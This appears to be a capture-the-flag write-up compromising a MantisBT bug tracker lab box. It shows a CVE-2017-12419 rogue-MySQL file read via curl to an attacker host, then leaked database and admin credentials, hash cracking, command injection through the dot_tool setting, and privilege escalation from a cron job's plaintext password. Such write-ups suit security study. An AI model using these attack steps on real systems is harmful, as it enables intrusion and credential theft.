Big one, buckle up!
nmap shows ports 22, 80 open.
Gobuster on port 80 (finally) leads us to `/bugtracker` endpoint
Further enum on `/bugtracker` shows `/config` `/admin` endpoints.
`/config` has `/config_inc.php` and `/config_inc_sample.php`
although config_inc.php is not readable, the sample hints that the config_inc should include the db password.
Gobuster on `/admin` shows install.php is accessible.
We find CVE-2017-12419, but not a proper POC
Basically, the CVE says, if `/admin` is not disabled, the install.php script will talk to any rogue mysql server that we host, and let you read files on the target system.
https://github.com/allyshka/Rogue-MySql-Server/blob/master/roguemysql.php for the rogue mysql server.
```zsh
php /opt/Rogue-Mysql-Server/roguemysql.php
>/etc/passwd

curl 'http://IP/bugtracker/admin/install.php?install=3&hostname=KALI_IP'
#gives /etc/passwd
#now, we need that /bugtracker/config/config_inc.php
#Since we saw the default page on port 80 was apache, we look at default apache installation location, /var/www/html
>/var/www/html/bugtracker/config/config_inc.html
```

```txt
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'bugtracker';
$g_db_username            = 'root';
$g_db_password            = 'SuperSequelPassword';

$g_crypto_master_salt     = 'OYAxsrYFCI+xsFw3FNKSoBDoJX4OG5aLrp7rVmOCFjU=';
```
So, now we loginto the db
```zsh
mysql -h 192.168.121.204 -D bugtracker -u root --skip-ssl -p
show tables;
select * from mantis_user_table;

john hash_root.txt -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```
administrator : prayingmantis

Couldnt find any results for mantisbt 2.5.2 exploits
Going back to the walkthrough, they show they get the result for the same search terms, and explain the exploit. Basically, by abusing certain configuration options (dot_tool / neato_tool), we can inject commands into the server.
1. Enable Graphs
2. Set dot_tool to a malicious command
3. Trigger the workflow graph to execute it

After this, we get a www-data shell!

---
No normal privesc. So we move on to pspy
There, we see a cronjob being run every minute or so, by UID 1000. It runs `/home/mantis/db_backups/backup.sh`, which in turn is running a mysqldump, but we're able to see plaintext creds.
`CMD: UID=1000 PID=8794   | mysqldump -u bugtracker -pBugTracker007 bugtracker`
```zsh
su mantis #BugTracker007
sudo -l
#ALL
sudo -i
```
root!
